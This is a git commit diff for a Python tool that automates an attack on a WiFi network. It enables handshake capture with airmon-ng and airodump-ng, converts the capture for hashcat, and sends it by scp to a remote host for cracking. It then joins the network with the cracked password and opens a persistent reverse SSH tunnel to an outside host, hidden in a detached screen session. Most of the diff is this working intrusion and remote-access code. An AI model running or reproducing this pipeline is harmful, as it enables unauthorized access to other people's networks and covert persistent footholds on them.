ea0a6321b821fd61ca3b7d8b9d07fda5297bb8a7
Pablo G.A <pabloga9@hotmail.com>
2024-08-22 19:57:34 +0200

    Improvements

--- src/main.py
+++ src/main.py
@@ -76,6 +76,37 @@ def pcap_to_hashcat_format(file_name: str):
         sys.exit(1)
     else:
         write_log(f'[+] .cap file exported correctly to hashcat format')
+        
+        
+def open_reverse_tunnel(persistent = False):
+    reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
+    
+    remote_user = reverse_tunnel_information.get('user')
+    remote_host = reverse_tunnel_information.get('host')
+    if not remote_user or not remote_host:
+        write_log(f'[!] You must specify fields "user" and "host" to open a reverse tunnel')
+        sys.exit(1)
+    
+    remote_port = 9090
+    if reverse_tunnel_information.get('port'):
+        remote_port = reverse_tunnel_information.get('port')
+
+    if persistent:
+        command = f'screen -dmS reverse_ssh_tunnel ssh -i {key_path} -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
+        subprocess.run(command, shell=True, text=True)
+        return None
+    else:
+        command = ["ssh", "-i", key_path, "-R", f"{remote_port}:localhost:22", f"{remote_user}@{remote_host}", "-N"]
+        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return process
+
+
+def kill_process(process):
+    process.terminate()
+    try:
+        process.wait(10)
+    except Exception:
+        process.kill()
 
 
 if __name__ == '__main__':
@@ -88,18 +119,17 @@ if __name__ == '__main__':
     # Setting interface in monitor mode
     interface = get_config_field('interface')
 
-    # airmon: Airmon = Airmon()
-    # airmon.check(kill=True)
-    # monitor_interface: str = airmon.start(interface)
-    monitor_interface: str = 'wlan0mon'
+    airmon: Airmon = Airmon()
+    airmon.check(kill=True)
+    monitor_interface: str = airmon.start(interface)
 
     # Capturing packets with airodump-ng
-    # airodump: Airodump = Airodump()
+    airodump: Airodump = Airodump()
 
     # Exporting csv file to get all networks
     output_file_name = 'networks'
-    # args = ['--output-format csv', f'-w src/files/{output_file_name}']
-    # airodump.exec(monitor_interface, args)
+    args = ['--output-format csv', f'-w src/files/{output_file_name}']
+    airodump.exec(monitor_interface, args)
 
     # Once airodump has stored all networks, I get the network bssid and its channel
     network_ssid = get_config_field('ssid')
@@ -110,39 +140,39 @@ if __name__ == '__main__':
     # Get 4-way-handshake
     handshake_file_name = f'{network_ssid}-handshake'
     args = [f'-c {channel}', f'--bssid {bssid}', f'-w src/files/{handshake_file_name}', '--output-format pcap']
-    # shell_command = airodump.get_str_shell_command(monitor_interface, args)
+    shell_command = airodump.get_str_shell_command(monitor_interface, args)
     
     # Execute airodump-ng as subprocess
-    # process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    # aircrack: Aircrack = Aircrack()
+    aircrack: Aircrack = Aircrack()
     
-    # found_handshake = False
-    # while not found_handshake:
-        # found_handshake = aircrack.check_captured_handshake(handshake_file_name)
-        # time.sleep(15)
+    found_handshake = False
+    while not found_handshake:
+        found_handshake = aircrack.check_captured_handshake(handshake_file_name)
+        time.sleep(15)
         
-    # process.terminate()
-    # try:
-    #     process.wait(10)
-    # except Exception:
-    #     process.kill()
+    process.terminate()
+    try:
+        process.wait(10)
+    except Exception:
+        process.kill()
         
-    # write_log(f'[+] Handshake captured')
+    write_log(f'[+] Handshake captured')
     
     # Stop monitor mode and restart NetworkManager
-    # airmon.stop(monitor_interface)
+    airmon.stop(monitor_interface)
     
-    # command = 'service NetworkManager restart'
-    # output = subprocess.run(command, shell=True, capture_output=True, text=True)
-    # if output.stderr:
-    #     write_log(f'[!] Error executing command "{command}"')
+    command = 'service NetworkManager restart'
+    output = subprocess.run(command, shell=True, capture_output=True, text=True)
+    if output.stderr:
+        write_log(f'[!] Error executing command "{command}"')
         
     # Enable internet through SIM card
-    # enable_internet()
+    enable_internet()
     
     # Transform .cap file to hashcat format with hcxpcappngtool
-    # hashcat_format_file_name = pcap_to_hashcat_format(handshake_file_name)
+    hashcat_format_file_name = pcap_to_hashcat_format(handshake_file_name)
     
     # Once psk.hc22000 has been stored, send via scp
     method_to_send: dict = get_config_field("send_handshake")
@@ -161,16 +191,19 @@ if __name__ == '__main__':
         else:
             write_log("[!] You must specify fields 'user' and 'host' to use scp")
             
-    print('[+] Ahora empieza la espera para recibir la password crackeada')
+    # Open reverse tunnel to receive cracked password
+    process = open_reverse_tunnel()
+    
     cracked_password: str = None
     while not cracked_password:
         try:
             with open('src/files/cracked_password.txt') as f:
                 cracked_password = f.read()
-                print(cracked_password)
+                kill_process(process)
                     
         except FileNotFoundError:
-            time.sleep(120)  # wait for 2 minutes to check again
+            # time.sleep(120)  # wait for 2 minutes to check again in PROD
+            time.sleep(30)
             
     # Generate wpa config file
     command = f'wpa_passphrase {network_ssid} {cracked_password}'
@@ -185,28 +218,13 @@ if __name__ == '__main__':
         sys.exit(1)
     
     time.sleep(30)
-    print('Conectado a la wifi')
-        
+
     # Getting an IP
     command = f'dhclient -r; dhclient wlan0'
     output = subprocess.run(command, shell=True, text=True)
     
     # Open reverse tunnel
-    print('[+] Starting reverse tunnel')
-    reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
-    
-    remote_user = reverse_tunnel_information.get('user')
-    remote_host = reverse_tunnel_information.get('host')
-    if not remote_user or not remote_host:
-        write_log(f'[!] You must specify fields "user" and "host"')
-        sys.exit(1)
-    
-    remote_port = 9090
-    if reverse_tunnel_information.get('port'):
-        remote_port = reverse_tunnel_information.get('port')
-    
-    command = f'screen -dmS reverse_ssh_tunnel ssh -i {key_path} -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
-    subprocess.run(command, shell=True, text=True)
+    open_reverse_tunnel(persistent=True)
     
     '''
     Listo!! A partir de aqui a lanzar scripts
